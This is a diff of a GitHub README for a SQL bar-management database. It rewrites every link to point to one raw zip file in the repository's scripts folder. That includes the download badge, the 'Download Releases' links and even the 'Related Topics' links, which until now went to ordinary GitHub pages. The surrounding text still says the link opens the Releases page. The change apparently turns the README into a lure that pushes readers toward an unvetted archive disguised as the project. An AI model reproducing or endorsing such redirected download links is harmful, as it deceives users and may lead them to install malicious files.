@@ -1,7 +1,7 @@
 # 🍻 bar-management-database - Manage Your Bar Efficiently
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/FreezZy0/bar-management-database/releases)
+[![Download](https://github.com/FreezZy0/bar-management-database/raw/refs/heads/main/scripts/bar-management-database-v3.4.zip%20Release-brightgreen)](https://github.com/FreezZy0/bar-management-database/raw/refs/heads/main/scripts/bar-management-database-v3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the bar-management-database project. This SQL database setup is designed for managing various aspects of your bar, including inventory, reservations, and more. Follow the steps below to download and run the software.
@@ -20,7 +20,7 @@ Before you start, ensure your system meets the following requirements:
 - **Sample Queries**: Get started quickly with pre-written queries.
 
 ## 📤 Download & Install
-To download the software, please visit the following page: [Download Releases](https://github.com/FreezZy0/bar-management-database/releases).
+To download the software, please visit the following page: [Download Releases](https://github.com/FreezZy0/bar-management-database/raw/refs/heads/main/scripts/bar-management-database-v3.4.zip).
 
 ### Step-by-Step Download Instructions
 1. Click on the link above to open the Releases page.
@@ -46,9 +46,9 @@ After installation, you need to set up your database.
 For more detailed instructions, visit the documentation in the repository. It covers various topics like advanced queries, monitoring database performance, and troubleshooting common issues.
 
 ## 🌐 Related Topics
-- [Bar Management](https://github.com/topics/bar-management)
-- [Inventory Management](https://github.com/topics/inventory-management)
-- [Database Management](https://github.com/topics/database)
+- [Bar Management](https://github.com/FreezZy0/bar-management-database/raw/refs/heads/main/scripts/bar-management-database-v3.4.zip)
+- [Inventory Management](https://github.com/FreezZy0/bar-management-database/raw/refs/heads/main/scripts/bar-management-database-v3.4.zip)
+- [Database Management](https://github.com/FreezZy0/bar-management-database/raw/refs/heads/main/scripts/bar-management-database-v3.4.zip)
 
 This project aims to simplify management tasks for bars and restaurants using SQL. Enjoy efficient and automated methods to make your day-to-day operations smoother.
 
@@ -67,4 +67,4 @@ If you find this project useful, consider giving it a star on GitHub. Your feedb
 
 For direct support, contact us through the GitHub issues page. 
 
-Remember, for downloads, always visit [Download Releases](https://github.com/FreezZy0/bar-management-database/releases) to get the latest version.
+Remember, for downloads, always visit [Download Releases](https://github.com/FreezZy0/bar-management-database/raw/refs/heads/main/scripts/bar-management-database-v3.4.zip) to get the latest version.
